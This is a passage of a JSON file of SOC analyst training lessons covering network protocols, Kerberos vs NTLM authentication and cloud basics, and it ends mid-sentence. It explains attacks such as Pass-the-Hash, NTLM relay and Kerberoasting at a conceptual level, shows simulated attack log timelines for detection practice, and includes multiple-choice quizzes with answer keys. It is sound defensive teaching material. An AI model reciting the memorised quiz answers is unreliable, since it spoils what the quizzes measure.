      "content": "Understanding six protocols in isolation is useful, but real investigations chain several of them together in minutes. Here is a compact, realistic walk-through showing how a suspicious file-transfer incident touches DHCP, DNS, SSH, and SMB in the same short window — and how an analyst reads across all four log sources as one story.\n\n```\n08:59:50  DHCP    lease granted: mac=AC:DE:11:22:33:44 ip=10.4.2.61\n                   hostname=LAPTOP-KRAVITZ\n\n09:00:04  DNS     client=10.4.2.61 query=update-cdn-fastcheck.info\n                   type=A answer=185.220.101.7\n\n09:00:09  SSH     client=10.4.2.61 -> server=10.4.9.15 port=22\n                   auth=publickey user=svc-build result=success\n\n09:00:41  SMB     client=10.4.9.15 -> server=10.4.9.16 port=445\n                   share=C$ action=write file=payload.exe\n\n09:00:44  SMB     client=10.4.9.15 -> server=10.4.9.17 port=445\n                   share=C$ action=write file=payload.exe\n```\n\nReading it as one narrative: at 08:59:50 **DHCP** tells you which physical laptop just got address `10.4.2.61` — that lease record is what lets you name the machine later. Nine seconds later, **DNS** shows that same address resolving an unfamiliar, generic-sounding domain — worth a reputation check, since it does not match any known vendor. Five seconds after that, **SSH** shows the laptop authenticating to an internal build server (`10.4.9.15`) using a service account's key — plausible on its own. But the very next entries are **SMB** writes of the *same executable file* from that build server out to *two other internal machines' hidden administrative shares* within three seconds of each other — the fan-out pattern this lesson's SMB section told you to watch for.\n\nNo single log line looks alarming in isolation; the DHCP lease is routine, the DNS query alone is mildly odd, the SSH login is normal service-account behaviour, and one SMB write could be legitimate deployment. It is the **sequence and the fan-out** — one host resolving a strange domain, then immediately pushing the same file to multiple machines' hidden administrative shares — that turns four ordinary-looking log lines into a lateral-movement narrative worth escalating. This is the core analyst skill every protocol in this lesson feeds into: read the individual conversation, then read the sequence across conversations."
    }
  ],
  "keyTakeaways": [
    "A protocol is a shared language and rulebook between computers; each has a well-known port (DNS 53, DHCP 67/68, SSH 22, SMB 445) and leaves logs that reveal both normal work and attacker activity.",
    "DNS turns names into IP addresses (the phonebook), and DHCP hands new devices their IP, gateway, and DNS settings automatically via the four-step DORA exchange.",
    "SSH gives encrypted remote control of a machine on port 22 (watch for brute force and unusual logins); SMB shares files and printers on port 445 (watch for lateral movement and ransomware spread).",
    "SPF (a DNS list of servers allowed to send a domain's mail) and DKIM (a DNS-published cryptographic signature proving the message is authentic and unaltered) together — with DMARC's policy — expose spoofed phishing email; their pass/fail results appear in message headers.",
    "No single protocol's log line tells the whole story — real investigations chain DHCP (who had this IP), DNS (what it looked up), SSH (where it logged in), and SMB (what it touched) into one timeline, where the sequence and fan-out pattern matter more than any single event."
  ],
  "quiz": [
    {
      "question": "A user reports that a website will not load, and you notice their device never received an answer when it tried to translate the site's name into an address. Which protocol is responsible for that name-to-address translation, and on which well-known port does it operate?",
      "options": [
        {
          "label": "DHCP on port 67, because DHCP is what resolves human-friendly website names into the numeric IP addresses that routers actually use to move traffic.",
          "value": "a"
        },
        {
          "label": "DNS on port 53, because DNS is the phonebook that translates a name like www.example.com into an IP address before any connection can begin.",
          "value": "b"
        },
        {
          "label": "SMB on port 445, because file-sharing servers are what hold the mapping between website names and their corresponding numeric internet addresses.",
          "value": "c"
        },
        {
          "label": "SSH on port 22, because the encrypted remote-login service is what performs name lookups securely on behalf of the connecting client device.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "DNS (Domain Name System) is the protocol that translates names into IP addresses, and it operates on port 53; without a DNS answer the browser has no address to connect to. DHCP hands out network settings, not name resolution. SMB shares files and printers on port 445. SSH provides encrypted remote login on port 22. Only DNS does name-to-address translation."
    },
    {
      "question": "A brand-new laptop is plugged into the office network and, within a second, it has an IP address, a default gateway, and DNS servers — with nobody typing anything in. Which protocol did this, and what is the correct order of its four-step exchange?",
      "options": [
        {
          "label": "DHCP, using the DORA order: Discover, then Offer, then Request, then Acknowledge, so the device asks for settings and the server leases them.",
          "value": "a"
        },
        {
          "label": "DHCP, using the order Offer, Discover, Acknowledge, Request, where the server speaks first and the client confirms the lease afterwards.",
          "value": "b"
        },
        {
          "label": "DNS, using a Discover and Acknowledge pair, because the phonebook service is what assigns each new device its address and gateway.",
          "value": "c"
        },
        {
          "label": "SSH, using an encrypted handshake, because remote-control sessions are what configure a new device's address settings when it first joins.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "DHCP automatically supplies IP address, gateway, and DNS settings using the DORA sequence: Discover (client asks), Offer (server proposes), Request (client accepts), Acknowledge (server confirms and records the lease). Option b lists the steps in the wrong order. DNS resolves names and does not assign addresses. SSH is for encrypted remote login, not address configuration."
    },
    {
      "question": "You are triaging an email that claims to come from your company's CEO, but the message headers show spf=fail and dkim=fail. What do these two failing checks tell you, and why does it matter?",
      "options": [
        {
          "label": "It means the recipient's mailbox is full, because SPF and DKIM are storage checks that confirm whether the server has room to accept the incoming message.",
          "value": "a"
        },
        {
          "label": "It means the message was delayed in transit, because SPF and DKIM measure how long an email took to travel between the sending and receiving mail servers.",
          "value": "b"
        },
        {
          "label": "It means the sending server was not authorised for the domain and the message's signature did not verify, strongly suggesting the email is spoofed.",
          "value": "c"
        },
        {
          "label": "It means the email was successfully encrypted end to end, because passing or failing these checks reflects the strength of the message's transport encryption.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "SPF checks whether the sending server is on the domain's authorised list, and DKIM verifies a cryptographic signature proving the message is authentic and unaltered; both failing means the sender was not authorised and the signature did not verify, a strong indicator of spoofing. The other options invent unrelated meanings: SPF/DKIM have nothing to do with mailbox storage, delivery timing, or transport encryption strength."
    },
    {
      "question": "During an incident you see one workstation suddenly making connections to dozens of other machines on port 445 within a few minutes. Which protocol is in use, and why is this pattern suspicious?",
      "options": [
        {
          "label": "SSH, and it is suspicious because encrypted remote logins should only ever occur between two machines and never involve more than a single destination host.",
          "value": "a"
        },
        {
          "label": "SMB, and it is suspicious because fanning out to many hosts on 445 fits lateral movement or ransomware spreading across shared drives.",
          "value": "b"
        },
        {
          "label": "DNS, and it is suspicious because the phonebook service normally answers from a single resolver and should never contact many machines at once.",
          "value": "c"
        },
        {
          "label": "DHCP, and it is suspicious because address leases are always granted by exactly one server and never involve connections to multiple different hosts.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Port 445 is SMB, the Windows file-and-printer sharing protocol; one machine rapidly connecting to many others on 445 matches lateral movement (spreading tools) or ransomware reaching many shared drives at once, which is why it is a hunted red flag. SSH is port 22, DNS is port 53, and DHCP uses 67/68, so none of those match the port seen, making them incorrect."
    },
    {
      "question": "Why did SSH replace older remote-access tools like Telnet as the standard way to administer servers, and on which port does SSH listen?",
      "options": [
        {
          "label": "Because SSH encrypts the entire session including credentials and commands, whereas Telnet sent everything in readable plain text; SSH listens on port 22.",
          "value": "a"
        },
        {
          "label": "Because SSH automatically assigns IP addresses to the servers it manages, which Telnet could not do; SSH listens on port 67 for those requests.",
          "value": "b"
        },
        {
          "label": "Because SSH translates server names into addresses far faster than Telnet ever could; SSH listens on port 53 to perform those lookups.",
          "value": "c"
        },
        {
          "label": "Because SSH shares files between servers more efficiently than Telnet's method; SSH listens on port 445 to move that shared data.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "SSH became the standard because it encrypts the whole session — passwords and commands included — while Telnet transmitted everything as plain readable text that anyone capturing traffic could steal; SSH listens on port 22. The other options wrongly attribute DHCP's address assignment (port 67), DNS's name resolution (port 53), or SMB's file sharing (port 445) to SSH."
    }
  ],
  "references": [
    "https://www.cloudflare.com/learning/dns/what-is-dns/",
    "https://datatracker.ietf.org/doc/html/rfc2131",
    "https://dmarc.org/overview/",
    "https://attack.mitre.org/techniques/T1021/002/"
  ],
  "xp": 230,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-kerberos-vs-ntlm",
  "slug": "kerberos-vs-ntlm-explained",
  "title": "Kerberos vs NTLM: How Windows Authentication Really Works",
  "topic": "Windows Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "In a Windows network, before you can open a file share, read your email, or log into a server, the system has to answer one question: are you really who you say you are? Windows has two protocols for answering that question — the older NTLM and the modern Kerberos — and understanding the difference between them is one of the most useful things a SOC analyst can learn. The two work in completely different ways: NTLM is a direct challenge-and-response between you and a server, while Kerberos hands out signed tickets from a trusted authority. This lesson explains each one in plain language, lines them up side by side, walks two full worked event-ID timelines so you can recognize attacks at a glance, and shows why the choice between them matters so much when you are hunting for attackers.",
  "sections": [
    {
      "heading": "Two Different Ways to Prove Who You Are",
      "content": "**Authentication** means proving your identity to a computer so it will let you in. On a Windows domain, two protocols do this job, and they take very different approaches.\n\n**NTLM** (NT LAN Manager) is the older of the two. It works as a direct **challenge and response**: the server you are trying to reach challenges you to prove you know your password, and you respond in a way that proves it without sending the password itself. It is a private back-and-forth between just two parties — you and the server.\n\n**Kerberos** is the modern default, used in Active Directory domains since Windows 2000. Instead of proving yourself to every server separately, you prove yourself **once** to a trusted authority, which then gives you signed **tickets** you can present to any service. It is like the difference between showing your ID to every single doorman in a building (NTLM) versus showing your ID once at the front desk, getting a wristband, and flashing the wristband everywhere else (Kerberos).\n\nA useful real-life analogy runs through the whole lesson:\n\n- **NTLM is a bouncer who phones head office.** You tell the bouncer your name; he gives you a puzzle only the real you could solve; you solve it; he calls head office to confirm your answer is right. Head office knows your secret; the bouncer never does.\n- **Kerberos is a trusted ticket office.** You prove yourself once at the ticket office, which stamps you a master pass. Whenever you want to enter a specific attraction, you swap part of that master pass for a ticket to *that* attraction, and the attraction trusts it because it is stamped by the ticket office everyone already trusts.\n\nBoth protocols end with the same result — you are let in or turned away — but *how* they get there shapes their security, their weaknesses, and the traces they leave in your logs. The next two sections open up each conversation step by step."
    },
    {
      "heading": "NTLM — The Challenge and Response",
      "content": "**NTLM authenticates you through a three-message challenge-response**, and the crucial trick is that your password is never actually sent across the network. Here is the conversation, step by step.\n\n**Who does what, and when:**\n\n1. **Negotiate.** The **client** (your machine) contacts the **server** and says, \"I want to access you, and here is who I am.\" This begins the moment you try to reach a resource that uses NTLM.\n2. **Challenge.** The **server** replies with a random number called a **challenge** (a nonce) — essentially, \"Prove you know the password by doing some maths with this number.\"\n3. **Response.** The **client** takes that challenge and encrypts it using a value derived from the user's password — the **NT hash** — and sends the result back. Because it used the hash, it proved knowledge of the password without ever transmitting the password.\n4. **Verification.** The server usually cannot check the answer itself, because it does not store everyone's password. So it forwards the challenge and the response to a **Domain Controller**, which *does* hold the secret, over the Netlogon channel. The DC does the same maths and confirms whether the response is correct. On the DC this validation is recorded as **Event ID 4776**.\n\nThat is the whole exchange. Notice three important properties:\n\n- **The password hash *is* the credential.** Whatever proves your identity is derived from the hash, and the hash alone is enough to authenticate. This is the root of the **Pass-the-Hash** attack: if an attacker steals your NT hash from memory, they can authenticate as you *without ever knowing your password*, because NTLM never needed the plaintext.\n- **There is no mutual authentication.** The server proves nothing about itself to you. You have no assurance you are talking to the real server, which opens the door to **NTLM relay** attacks, where an attacker sits in the middle and forwards your response to a different server to log in as you.\n- **No trusted third party is built into the exchange** the way Kerberos uses one; the DC is only consulted to check the answer.\n\nNTLM still exists everywhere as a **fallback**, but these weaknesses are exactly why Microsoft moved to Kerberos as the default — and why NTLM traffic is something analysts watch closely."
    },
    {
      "heading": "Kerberos — Tickets from a Trusted Authority",
      "content": "**Kerberos replaces repeated password proofs with time-limited, signed tickets issued by a trusted third party.** That third party is the **KDC** (Key Distribution Center), a service that runs on every Active Directory **Domain Controller**. The KDC has two halves: the **Authentication Service (AS)** and the **Ticket Granting Service (TGS)**.\n\n**Who does what, and when:**\n\n1. **Log in once (get a TGT).** When you sign in, your machine proves your identity to the **AS**. Instead of a password hash flying to each server, the AS returns a master pass called a **Ticket Granting Ticket (TGT)**, encrypted so only the KDC can later read it. This request is logged as **Event ID 4768**. The clever part: your proof includes a **timestamp** encrypted with your password-derived key, which is why Kerberos requires clocks to be roughly in sync (within about five minutes).\n2. **Ask for a service ticket.** Later, when you want to reach a specific service — say a file server — your machine presents the TGT back to the **TGS** and says, \"Give me a ticket for this service.\" Services are named by a **Service Principal Name (SPN)**. The TGS issues a **service ticket** for that one service. This request is logged as **Event ID 4769**.\n3. **Present the ticket to the service.** Your machine hands the service ticket to the file server. The server trusts it because it is stamped (encrypted) by the KDC that both sides already trust — the server never has to contact the DC to verify you in real time.\n4. **Mutual authentication.** Unlike NTLM, Kerberos can prove the *server's* identity to the client too, so you know you are talking to the real service and not an impostor.\n\nKey properties to hold onto:\n\n- **A trusted third party (the KDC) vouches for everyone**, so services do not need to validate each login against the DC on the spot.\n- **Tickets are time-limited**, which reduces the window an attacker can reuse them.\n- **Mutual authentication** protects against impostor servers.\n\nThe ticket design is powerful, but it creates its own attack surface. **Kerberoasting** abuses the service-ticket step (4769) to crack service-account passwords offline. **Pass-the-Ticket** reuses a stolen ticket. A **Golden Ticket** forges a TGT after an attacker steals the KDC's master key. Each of these leaves distinct traces — which is exactly why analysts learn the ticket flow."
    },
    {
      "heading": "The Key Differences, Side by Side",
      "content": "Now that you have seen both conversations, the contrasts become clear. The single biggest difference is the **trust model**: NTLM is a private challenge between two machines with the DC merely checking the answer, while Kerberos is built around a **trusted third party (the KDC)** that issues tickets everyone honours.\n\n| Aspect | NTLM | Kerberos |\n|--------|------|----------|\n| Age / status | Older, legacy fallback | Modern default in AD |\n| Core mechanism | Challenge and response | Tickets from a KDC |\n| Trusted third party | Not part of the exchange (DC only verifies) | Central — the KDC issues everything |\n| Mutual authentication | No (server is not verified) | Yes (both sides verified) |\n| Depends on clock sync | No | Yes (timestamps, ~5 min) |\n| Signature attacks | Pass-the-Hash, NTLM relay | Kerberoasting, Pass-the-Ticket, Golden/Silver Ticket |\n| Key DC event IDs | 4776 | 4768 (TGT), 4769 (service ticket) |\n\nA few of these deserve a second look.\n\n**Mutual authentication** is a genuine security upgrade. Because NTLM never proves the server's identity, an attacker can relay your credentials to a different machine. Kerberos closes that gap by verifying both directions.\n\n### Tickets vs the hash\n\nIn NTLM the password-derived hash is effectively the reusable credential, which is why stealing a hash is so damaging. Kerberos hands out tickets that expire, narrowing the reuse window — though a stolen ticket or a forged Golden Ticket is still dangerous.\n\n### Clock dependency\n\nKerberos leans on timestamps to stop replay, so a domain with badly skewed clocks will see Kerberos fail and quietly **fall back to NTLM** — an important operational quirk that also has security consequences, as the next section explains."
    },
    {
      "heading": "When Windows Uses Which — and the SOC Angle",
      "content": "Windows does not let you pick a protocol by hand for everyday logins; it chooses automatically, and knowing the rule helps you read authentication logs.\n\n**Kerberos is used by default when the conditions are right:** the machine is domain-joined, it can reach a Domain Controller, and it connects to the target **by its hostname** (which lets Windows look up the service's SPN). This covers the majority of normal domain activity.\n\n**NTLM is the fallback, used when Kerberos cannot apply**, such as:\n\n- Connecting to a resource **by IP address** instead of hostname (no SPN to look up).\n- **Workgroup** or non-domain machines, and local-account logins.\n- **Legacy systems** or applications that only speak NTLM.\n- Situations where **no Domain Controller is reachable** or clocks are too far out of sync.\n\n### Why this matters to a SOC analyst\n\nThe mix of Kerberos and NTLM in your logs tells a story, and deviations from the normal mix are a hunting opportunity.\n\n- **A spike in Event 4776 (NTLM validation)** can mean a **brute-force / password-spray** against accounts, or **Pass-the-Hash** activity — especially if you see NTLM authentications where that user or system would normally use Kerberos.\n- **NTLM where you expect Kerberos** is itself a red flag. Attackers sometimes force NTLM (for example, by connecting via IP) precisely because it enables relay and pass-the-hash. Seeing an admin account authenticate over NTLM to a server it usually reaches by name deserves a look.\n- **Kerberos events tell their own story.** A single account requesting service tickets (**4769**) for many different services in a short time is a classic **Kerberoasting** pattern. Unusual TGT requests (**4768**), or tickets used from unexpected hosts, can indicate **Pass-the-Ticket** or a forged ticket.\n\nThe practical takeaway: you do not need to memorise every cryptographic detail, but you should know **which protocol should normally appear where**, and treat the *wrong* one showing up — NTLM in a Kerberos world — as a thread worth pulling."
    },
    {
      "heading": "Worked Example: Reading Event IDs 4768/4769/4776 Together in a Timeline",
      "content": "Theory becomes useful the moment you can read a real timeline of Event IDs and know instantly what's normal versus what's an attack in progress. Here are three short worked traces.\n\n### A normal Kerberos day, in events\n\n```\n08:31:02  EventID 4768  User: d.rosen  Result: Success   (TGT issued at login)\n08:31:03  EventID 4769  User: d.rosen  Service: cifs/fileserver01  Result: Success\n08:45:11  EventID 4769  User: d.rosen  Service: HTTP/intranet01    Result: Success\n```\n\nOne TGT (4768) at login, followed by a handful of service tickets (4769) spread minutes apart as the user opens a file share and then an intranet site — exactly the rhythm you'd expect from a person clicking around during their workday.\n\n### A Kerberoasting attempt, in the same event types\n\n```\n09:14:00  EventID 4769  User: j.taylor  Service: MSSQLSvc/db01     Result: Success\n09:14:00  EventID 4769  User: j.taylor  Service: MSSQLSvc/db02     Result: Success\n09:14:01  EventID 4769  User: j.taylor  Service: cifs/fileserver03 Result: Success\n09:14:01  EventID 4769  User: j.taylor  Service: HTTP/app07        Result: Success\n09:14:01  EventID 4769  User: j.taylor  Service: MSSQLSvc/db03     Result: Success\n   ... (30+ more services requested in the same second)\n```\n\nThe event type is identical to the normal example — still just 4769s — but the **shape** is completely different: one account requesting tickets for dozens of unrelated services within a single second, far faster than any human clicking through applications could produce. This is the Kerberoasting pattern in practice: a tool is systematically requesting a service ticket for every SPN it can find, so it can take the tickets offline and try to crack the service accounts' passwords at leisure, with no further contact with the domain controller needed.\n\n### A Pass-the-Hash / NTLM anomaly\n\n```\n14:02:15  EventID 4776  Workstation: FIN-LAPTOP-09   Account: svc-backup  Result: Success\n14:02:16  EventID 4776  Workstation: HR-LAPTOP-22    Account: svc-backup  Result: Success\n14:02:16  EventID 4776  Workstation: IT-LAPTOP-04    Account: svc-backup  Result: Success\n```\n\nHere a single service account authenticates via **NTLM** (4776) from three unrelated workstations within one second — service accounts normally run from one or two known hosts, not from a scatter of ordinary user laptops simultaneously. Combined with the fact that this account should typically use Kerberos on a healthy, domain-joined network, this NTLM burst from multiple hosts is a strong Pass-the-Hash indicator: an attacker who stole `svc-backup`'s NT hash from one compromised machine is now replaying it to authenticate as that account from several others.\n\nIn all three traces, notice that the *event IDs alone never tell the whole story* — it is the **rate, the diversity of targets, and the deviation from the account's normal pattern** that turns a routine authentication log into an unmistakable attack timeline."
    }
  ],
  "keyTakeaways": [
    "NTLM is an older challenge-response protocol between a client and a server (the DC only verifies the answer, logged as Event 4776); it has no mutual authentication and treats the password hash as the credential, which enables Pass-the-Hash and NTLM relay.",
    "Kerberos is the modern AD default: you authenticate once to the KDC to get a TGT (Event 4768), then trade it for time-limited service tickets (Event 4769); it adds mutual authentication and a trusted third party but depends on synchronized clocks.",
    "Windows uses Kerberos by default when domain-joined and connecting by hostname to a reachable DC, and falls back to NTLM for IP-based connections, workgroups, legacy apps, or when no DC is reachable.",
    "For a SOC analyst, seeing NTLM where Kerberos is expected, an NTLM (4776) spike, or one account requesting many service tickets (4769) are red flags for Pass-the-Hash, password spray, and Kerberoasting respectively.",
    "The event ID alone never proves an attack — it's the rate, diversity of targets, and deviation from an account's normal pattern (dozens of 4769s in one second, or one service account's NTLM hash used from several hosts at once) that turns a routine authentication timeline into an unmistakable Kerberoasting or Pass-the-Hash trace."
  ],
  "quiz": [
    {
      "question": "A junior analyst asks you what fundamentally distinguishes Kerberos from NTLM in how they authenticate a user. What is the single most important structural difference?",
      "options": [
        {
          "label": "NTLM encrypts network traffic while Kerberos leaves it in plain text, which is why Kerberos is considered the older and less secure of the two protocols.",
          "value": "a"
        },
        {
          "label": "Kerberos relies on a trusted third party (the KDC) that issues time-limited tickets, whereas NTLM is a direct challenge-response between the client and server.",
          "value": "b"
        },
        {
          "label": "NTLM requires the client and server clocks to be synchronized within five minutes, while Kerberos works regardless of any time difference between them.",
          "value": "c"
        },
        {
          "label": "Kerberos sends the user's plaintext password to each server it contacts, while NTLM keeps the password entirely on the domain controller at all times.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The core difference is the trust model: Kerberos uses a trusted third party, the KDC, to issue time-limited tickets, while NTLM is a direct challenge-response between client and server with the DC only verifying the answer. Option a reverses reality and is false. Option c has the clock dependency backwards — it is Kerberos, not NTLM, that needs synchronized clocks. Option d is wrong because neither protocol sends the plaintext password to servers."
    },
    {
      "question": "An attacker steals a user's NT hash from a machine's memory and then successfully authenticates to a file server as that user, without ever learning the actual password. Which protocol's design makes this Pass-the-Hash attack possible, and why?",
      "options": [
        {
          "label": "Kerberos, because its service tickets contain the user's plaintext password, which the attacker extracted directly from the file server's memory.",
          "value": "a"
        },
        {
          "label": "NTLM, because the password-derived hash is effectively the credential, so possessing the hash is enough to authenticate without the plaintext password.",
          "value": "b"
        },
        {
          "label": "Kerberos, because the KDC issues a new hash to every service, allowing a stolen hash to be replayed against any server in the domain at will.",
          "value": "c"
        },
        {
          "label": "NTLM, because it transmits the user's plaintext password across the network in every challenge, letting the attacker capture and reuse it.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Pass-the-Hash works against NTLM because the NT hash is effectively the credential: the challenge is answered using the hash, so an attacker holding the hash can authenticate without ever knowing the plaintext password. Option a is wrong because Kerberos tickets do not contain plaintext passwords. Option c misdescribes how the KDC works. Option d is wrong because NTLM specifically avoids sending the plaintext password over the network — that is the whole point of the hash."
    },
    {
      "question": "While reviewing Domain Controller logs you notice a single user account generating a burst of Event ID 4769 (Kerberos service ticket requests) for many different services in a short window. What attack pattern should you most suspect?",
      "options": [
        {
          "label": "NTLM relay, because 4769 records the moment an attacker forwards a captured NTLM response to a second server to authenticate as the victim.",
          "value": "a"
        },
        {
          "label": "A password spray over NTLM, because 4769 is the event written each time a single password is tried against many different user accounts.",
          "value": "b"
        },
        {
          "label": "Kerberoasting, because requesting many service tickets lets an attacker extract them and crack the service accounts' passwords offline.",
          "value": "c"
        },
        {
          "label": "A Golden Ticket forgery, because 4769 is logged only when an attacker creates a forged TGT using the stolen KDC master key.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "A single account requesting many service tickets (Event 4769) is the classic Kerberoasting pattern: the attacker collects service tickets and cracks the service accounts' passwords offline. Option a is wrong because NTLM relay is an NTLM technique, not a Kerberos 4769 event. Option b describes password spray, which is not what 4769 records. Option d is wrong because 4769 logs service-ticket requests, not TGT forgery, which concerns the TGT (4768) flow."
    },
    {
      "question": "In a healthy Active Directory domain, under which condition will Windows normally fall back to NTLM instead of using Kerberos, and why should that catch an analyst's attention?",
      "options": [
        {
          "label": "When a client connects to a resource by its IP address rather than hostname, because no SPN can be looked up; attackers may force this to enable relay or pass-the-hash.",
          "value": "a"
        },
        {
          "label": "When the client and the domain controller have perfectly synchronized clocks, because matching timestamps disable Kerberos and require the NTLM fallback instead.",
          "value": "b"
        },
        {
          "label": "When a user logs into a domain-joined machine by hostname with a reachable DC, because that is precisely the scenario Kerberos is unable to handle.",
          "value": "c"
        },
        {
          "label": "When the domain controller is fully reachable and healthy, because a working DC always forces every authentication onto the NTLM path by design.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Connecting by IP address instead of hostname means Windows cannot look up the service's SPN, so it falls back to NTLM; attackers sometimes force NTLM this way to enable relay or pass-the-hash, which is why it warrants attention. Option b is backwards — synchronized clocks help Kerberos, not disable it. Option c describes the exact scenario where Kerberos works, not where it fails. Option d is false because a healthy, reachable DC is what enables Kerberos, not NTLM."
    },
    {
      "question": "In your DC logs, a single service account requests Kerberos service tickets (Event 4769) for thirty different SPNs within one second, all successful. What does this timeline most likely indicate, and why is the rate itself meaningful?",
      "options": [
        {
          "label": "Normal application startup, because service accounts always request every SPN in the domain once immediately after a server reboot.",
          "value": "a"
        },
        {
          "label": "Kerberoasting, because a human clicking through applications could never generate that many distinct service-ticket requests within a single second.",
          "value": "b"
        },
        {
          "label": "A clock synchronization failure, because Event 4769 is logged automatically every time the domain controller's time drifts out of tolerance.",
          "value": "c"
        },
        {
          "label": "A password reset cascade, because changing one account's password forces the domain controller to reissue tickets for every service at once.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): thirty distinct service-ticket requests within one second is far faster than any human workflow, and matches an automated tool systematically requesting tickets for every SPN it can find — the Kerberoasting pattern. Option a invents a reboot behavior that does not exist. Option c misattributes 4769, which logs service-ticket requests, not clock-drift events. Option d is wrong because a password reset does not trigger mass ticket reissuance across unrelated services."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview",
    "https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm",
    "https://attack.mitre.org/techniques/T1550/002/",
    "https://attack.mitre.org/techniques/T1558/003/"
  ],
  "xp": 235,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-fundamentals-aws-azure",
  "slug": "cloud-security-fundamentals-aws-azure",
  "title": "Cloud Security Fundamentals: AWS & Azure for the SOC Analyst",
  "topic": "Cloud Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "More and more of the systems a SOC defends no longer live in a server room down the hall — they live in someone else's data centre, rented by the minute, reached over the internet, and configured entirely through software. That is the cloud, and it changes what an analyst watches and how. This beginner lesson builds the mental model from the ground up: what the cloud actually is, the two giants (AWS and Azure) and a plain-language map of their vocabulary, the three ways people interact with the cloud, the shared-responsibility line that decides what is yours to secure, the identity building blocks (principals, policies, and roles) that gate every action, a worked example of reading your very first cloud log event, and a tour of what attackers actually go after once they are inside. By the end you should be able to look at cloud terminology and a raw event without feeling lost.",
  "sections": [
    {
      "heading": "What 'the Cloud' Really Means",
      "content": "**The cloud** is simply someone else's computers that you rent over the internet instead of buying and running your own. A company like Amazon or Microsoft builds enormous data centres full of servers, storage, and networking, then lets customers use slices of that capacity on demand and pay only for what they use. Instead of waiting weeks to buy and install a physical server, an engineer creates one in the cloud in seconds with a few clicks or a command.\n\nThree properties make the cloud different from the traditional server room, and each matters to a defender:\n\n- **On-demand and elastic.** Resources appear and disappear in seconds. A single mistaken command can create — or delete — a hundred servers. Speed cuts both ways.\n- **Everything is software-defined.** There are no cables to plug in. Networks, firewalls, disks, and permissions are all created and changed through configuration. This means a misconfiguration, not a broken wire, is the typical cause of a cloud breach.\n- **Reachable over the internet.** Cloud resources are managed through internet-facing control interfaces, so identity and access control become the real perimeter. If an attacker steals the right credential, they do not need to breach a firewall — they just log in.\n\nThe cloud is usually described in service models. **IaaS** (Infrastructure as a Service) rents raw building blocks like virtual machines and disks. **PaaS** (Platform as a Service) rents a ready-made platform to run applications without managing the underlying servers. **SaaS** (Software as a Service) is a finished application you just use, like a web-based email or CRM. Most of what a SOC analyst investigates in AWS and Azure sits in the IaaS and PaaS layers, where the customer still controls configuration and therefore still owns much of the security.\n\nThe headline shift for a defender is this: in the traditional world you watched packets and hosts; in the cloud you increasingly watch **identities and API calls**. Someone using stolen credentials to spin up servers or read a storage bucket looks, at the network level, like perfectly normal traffic to a cloud provider. The evidence lives in the cloud's own activity logs, which later sections unpack."
    },
    {
      "heading": "AWS and Azure — A Vocabulary Map",
      "content": "The two dominant clouds are **Amazon Web Services (AWS)** and **Microsoft Azure**. (Google Cloud is the third major player.) They do the same kinds of things but use different names, and one of the fastest ways to become comfortable is to learn the translation table, because an alert or log will speak one dialect or the other.\n\nFirst, the container that holds everything:\n\n- In **AWS**, the top-level container is an **account**, and large organisations group many accounts under **AWS Organizations**.\n- In **Azure**, resources live in a **subscription**, subscriptions sit under **management groups**, and the identity system is **Microsoft Entra ID** (formerly Azure Active Directory).\n\nNow the core service types, side by side:\n\n| What it does | AWS name | Azure name |\n|--------------|----------|------------|\n| Identity & access | IAM | Entra ID + Azure RBAC |\n| Virtual machine (compute) | EC2 | Virtual Machines |\n| Object storage | S3 | Blob Storage |\n| Virtual network | VPC | Virtual Network (VNet) |\n| Cloud firewall | Security Groups | Network Security Groups (NSG) |\n| Serverless function | Lambda | Azure Functions |\n| Management activity log | CloudTrail | Azure Activity Log |\n| Managed threat detection | GuardDuty | Microsoft Defender for Cloud |\n\nYou do not need to memorise every service, but you should recognise these anchors, because they name the places attackers go and the logs you read. When an alert says an **EC2 instance** was launched or an **S3 bucket** was made public, you are in AWS; when it mentions a **VM**, a **Blob container**, or an **Entra sign-in**, you are in Azure.\n\nA further useful distinction is **regions** and **availability zones**. Cloud providers run data centres in many geographic **regions** (such as `us-east-1` in AWS or `West Europe` in Azure), each divided into isolated **availability zones**. Region matters for investigations: activity in a region your company never uses is itself suspicious, and attackers sometimes create resources in unused regions precisely to avoid notice."
    },
    {
      "heading": "Three Ways People Touch the Cloud",
      "content": "Everything that happens in AWS or Azure happens through one of three interfaces, and — this is the key insight for an analyst — **they all funnel down to the same underlying API calls**, which is what makes cloud activity so loggable.\n\n1. **The web console.** A point-and-click website where a human logs in and manages resources visually. Convenient for people, and console logins are a prime authentication event to monitor (especially the powerful **root** or **Global Administrator** account).\n2. **The command-line interface (CLI) and SDKs.** Tools like the `aws` command or Azure's `az` command let engineers and scripts drive the cloud with typed commands or code. Automation lives here, and so do many attacker tools, because scripting is faster than clicking.\n3. **The API directly.** Underneath the console and the CLI, every action is really a call to the provider's **API** — a defined request such as \"create this VM\" or \"read this object.\" The console and CLI are just friendlier wrappers around these calls.\n\nBecause all three collapse into API calls, the provider can record **every action as a log entry**: who made the call, which action, on what resource, from which IP, and whether it succeeded. That recording is the single most important fact about cloud security monitoring. Whether an attacker clicked in the console or ran a script, the provider's activity log (CloudTrail or Azure Activity Log) captures the API call underneath.\n\nThis also reframes what \"access\" means in the cloud. Traditionally, reaching a server meant being on the network. In the cloud, the interfaces are internet-facing, so the thing that gates access is the **credential and its permissions**, not network location. An engineer in a coffee shop and an attacker on another continent hit the very same API endpoint; what separates them is whether they hold a valid credential and what that credential is 